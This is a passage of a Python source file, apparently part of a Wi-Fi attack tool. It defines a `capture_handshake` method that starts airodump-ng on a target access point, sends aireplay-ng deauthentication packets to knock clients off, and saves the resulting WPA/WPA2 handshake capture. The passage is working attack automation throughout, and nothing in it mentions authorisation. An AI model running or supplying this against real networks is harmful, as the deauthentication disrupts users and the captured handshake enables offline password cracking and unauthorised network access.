 25    def capture_handshake(self, 
 26                          monitor_interface: str, 
 27                          target_bssid: str, 
 28                          target_channel: str, 
 29                          output_file_prefix: str,
 30                          capture_time_seconds: int = 30,
 31                          deauth_count: int = 5,
 32                          auto_mode: bool = False
 33                         ) -> Optional[str]:
 34        """
 35        Attempts to capture a WPA/WPA2 handshake for a given target.
 36
 37        Args:
 38            monitor_interface (str): The interface name in monitor mode (e.g., 'wlan0mon').
 39            target_bssid (str): The BSSID of the target access point.
 40            target_channel (str): The channel of the target access point.
 41            output_file_prefix (str): Prefix for the .cap file (e.g., 'handshake_AP1').
 42                                      The actual file will be {prefix}-01.cap.
 43            capture_time_seconds (int): How long to attempt capturing the handshake.
 44            deauth_count (int): Number of deauthentication packets to send to force handshake.
 45            auto_mode (bool): If True, will wait for `capture_time_seconds` automatically.
 46                              If False, will inform user to press Ctrl+C to stop early.
 47
 48        Returns:
 49            Optional[str]: Full path to the captured .cap file if successful, None otherwise.
 50        """
 51        self.logger.info(f"[CaptureManager] Starting handshake capture for BSSID {target_bssid} on channel {target_channel} via {monitor_interface}...")
 52
 53        base_output_path = os.path.join(tempfile.gettempdir(), output_file_prefix)
 54        final_cap_file_path = f"{base_output_path}-01.cap"
 55        
 56        # Files airodump-ng creates (excluding the .cap itself from automatic cleanup loop)
 57        airodump_auxiliary_files_to_clean: List[str] = [ # Explicitly type as List[str]
 58            f"{base_output_path}-01.csv", 
 59            f"{base_output_path}-01.kismet.csv", 
 60            f"{base_output_path}-01.kismet.netxml", 
 61            f"{base_output_path}-01.log.csv"
 62        ]
 63        
 64        # Clean up any leftover auxiliary files from previous runs with the same prefix
 65        for f_to_clean in airodump_auxiliary_files_to_clean:
 66            if os.path.exists(f_to_clean):
 67                try:
 68                    os.remove(f_to_clean)
 69                    self.logger.debug(f"[CaptureManager] Removed leftover auxiliary temp file: {f_to_clean}")
 70                except OSError as e_remove:
 71                    self.logger.warning(f"Could not remove leftover auxiliary temp file {f_to_clean}: {e_remove}")
 72
 73        # If .cap file from previous run exists, remove it to ensure a fresh capture.
 74        if os.path.exists(final_cap_file_path):
 75            try:
 76                os.remove(final_cap_file_path)
 77                self.logger.debug(f"[CaptureManager] Removed old .cap file: {final_cap_file_path}")
 78            except OSError as e_remove:
 79                self.logger.warning(f"Could not remove old .cap file {final_cap_file_path}: {e_remove}")
 80
 81
 82        dump_proc: Optional[subprocess.Popen[bytes]] = None
 83        try:
 84            # Start airodump-ng in the background to capture traffic
 85            airodump_cmd: List[str] = [ # Explicitly type as List[str]
 86                "airodump-ng",
 87                "--bssid", target_bssid,
 88                "--channel", target_channel, 
 89                "--write", base_output_path, # airodump-ng automatically adds -01.cap etc.
 90                monitor_interface
 91            ]
 92            # CRITICAL FIX 1: Pass `airodump_cmd` (list) directly to Popen
 93            self.logger.debug(f"[CaptureManager] Executing airodump-ng: {shlex.join(airodump_cmd)}")
 94            dump_proc = subprocess.Popen(airodump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setpgrp)
 95
 96            self.logger.info(f"[CaptureManager] Sending {deauth_count} deauth packets to {target_bssid}...")
 97            aireplay_cmd: List[str] = [ # Explicitly type as List[str]
 98                "aireplay-ng", 
 99                "--deauth", str(deauth_count), 
100                "-a", target_bssid, 
101                monitor_interface
102            ]
103            # CRITICAL FIX 2: Pass `aireplay_cmd` (list) directly to shelltools.run_command
104            self.logger.debug(f"[CaptureManager] Executing aireplay-ng: {shlex.join(aireplay_cmd)}")
105            shelltools.run_command(aireplay_cmd, require_root=True, check=False) 
106
107            self.logger.info(f"[CaptureManager] Waiting for handshake capture ({capture_time_seconds}s) in auto mode...")
108            
109            for _ in range(capture_time_seconds):
110                if dump_proc and dump_proc.poll() is not None:
111                    self.logger.warning("[CaptureManager] airodump-ng terminated prematurely during capture wait.")
112                    break
113                time.sleep(1)
114            
115            self.logger.info("[CaptureManager] Stopping airodump-ng capture...")
116            if dump_proc and dump_proc.poll() is None:
117                dump_proc.terminate()
118                try:
119                    dump_proc.wait(timeout=5)
120                except subprocess.TimeoutExpired:
121                    self.logger.warning("[CaptureManager] airodump-ng did not terminate gracefully, killing.")
122                    dump_proc.kill()
123                    dump_proc.wait()
124            self.logger.debug("[CaptureManager] Airodump-ng process finished.")
125
126            if os.path.exists(final_cap_file_path) and os.path.getsize(final_cap_file_path) > 0:
127                self.logger.info(f"[] Handshake captured: {final_cap_file_path}")
128                return final_cap_file_path
129            else:
130                self.logger.error(f"[] Handshake capture failed. No valid .cap file found at {final_cap_file_path}.")
131                return None
132
133        except FileNotFoundError as fnfe:
134            self.logger.error(f"[CaptureManager] Command not found (airodump-ng/aireplay-ng): {fnfe}. Please ensure it's installed and in your PATH.")
135            return None
136        except Exception as e:
137            self.logger.error(f"[CaptureManager] An unexpected error occurred during handshake capture: {e}")
138            return None
139        finally:
140            if dump_proc and dump_proc.poll() is None:
141                self.logger.warning("[CaptureManager] airodump-ng process was still running in finally block, terminating.")
142                dump_proc.terminate()
143                try:
144                    dump_proc.wait(timeout=5)
145                except subprocess.TimeoutExpired:
146                    dump_proc.kill()
147            
148            # Clean up all auxiliary files, but NOT the .cap file
149            for f_to_clean in airodump_auxiliary_files_to_clean:
150                if os.path.exists(f_to_clean):
151                    try:
152                        os.remove(f_to_clean)
153                        self.logger.debug(f"[CaptureManager] Removed temp auxiliary file: {f_to_clean}")
154                    except OSError as e_remove:
155                        self.logger.warning(f"Could not remove temp auxiliary file {f_to_clean}: {e_remove}")
